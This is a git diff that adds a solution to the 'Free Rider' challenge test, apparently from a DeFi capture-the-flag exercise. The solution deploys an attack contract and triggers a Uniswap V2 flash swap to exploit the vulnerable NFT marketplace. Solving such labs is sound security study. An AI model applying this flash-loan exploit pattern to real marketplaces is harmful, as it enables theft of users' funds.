@@ -106,6 +106,25 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log(`Deploying FreeRiderSwapV2Callee...`);
+        const FreeRiderSwapV2CalleeFactory = await ethers.getContractFactory('FreeRiderSwapV2Callee', player);
+        let FlashLoanCallee = await FreeRiderSwapV2CalleeFactory.deploy(
+            weth.address, 
+            marketplace.address, 
+            nft.address,
+            devsContract.address,
+            AMOUNT_OF_NFTS
+        );
+
+        console.log(`Calling flash swap...`);
+        ///// https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
+        await uniswapPair.connect(player).swap(
+            NFT_PRICE,                                     ////amount0Out; WETH ; borrow as nft price
+            0,                                             ////amount1out; DVT
+            FlashLoanCallee.address,                       ////FlashLoan receiver
+            ethers.utils.formatBytes32String("flashswap"), ////length>0 to trigger flash swap
+            {gasLimit:2000000}
+        );
     });
 
     after(async function () {
